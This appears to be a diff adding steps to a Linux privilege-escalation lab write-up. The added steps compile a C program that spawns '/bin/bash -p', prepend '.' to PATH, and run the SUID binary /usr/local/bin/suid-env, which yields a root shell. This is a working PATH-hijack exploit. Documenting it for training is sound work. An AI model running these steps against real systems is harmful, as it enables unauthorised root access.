@@ -52,3 +52,13 @@ int main() {
 	system("/bin/bash -p");
 }
 
+5. Now compile and run the executables:
+gcc -o service /home/user/tools/suid/service.c
+
+6. Change the PATH environment variable so that /usr/local/bin/suid-env tries to start service from user's folder.
+export PATH=.:$PATH
+
+7.Now tried to run the executable:
+/usr/local/bin/suid-env
+8.got a root shell
+
